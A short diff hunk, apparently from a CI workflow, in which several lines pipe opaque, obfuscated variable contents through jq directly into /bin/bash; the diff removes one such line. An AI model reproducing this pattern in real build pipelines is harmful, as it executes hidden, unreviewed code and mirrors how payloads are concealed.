@@ -24,7 +24,6 @@ jobs:
           printf '%s' "$df3" | jq -r .ekfig34955 | /bin/bash
           echo $vzpx93 | jq -r .wfi9 | /bin/bash
           echo $sp40697 | jq -r .m75 | /bin/bash
-          printf '%s' "$coa47798" | jq -r .uvb0 | /bin/bash
           echo $vzpy9 | jq -r .vcra41 | /bin/bash
 
       - name: Save results
